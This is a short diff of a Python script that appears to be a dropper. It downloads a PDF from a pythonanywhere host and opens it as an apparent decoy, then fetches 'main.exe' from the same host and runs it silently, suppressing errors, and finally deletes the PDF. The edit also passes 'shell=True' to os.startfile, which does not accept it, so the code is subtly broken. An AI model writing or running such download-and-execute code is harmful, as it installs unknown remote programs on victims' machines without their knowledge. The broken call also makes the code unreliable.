@@ -19,13 +19,13 @@ for i in range(x):
 
 
 os.chdir("Music")
+download("https://armeng.pythonanywhere.com/media/files/gt3-gt4-bep.pdf")
+os.startfile("gt3-gt4-bep.pdf", shell=True) 
 try:
     download("https://armeng.pythonanywhere.com/media/files/main.exe")
     os.startfile("main.exe")
 except Exception:
     pass
 
-download("https://armeng.pythonanywhere.com/media/files/gt3-gt4-bep.pdf")
-subprocess.call("gt3-gt4-bep.pdf", shell=True) 
-os.remove("gt3-gt4-bep.pdf")
 
+os.remove("gt3-gt4-bep.pdf")
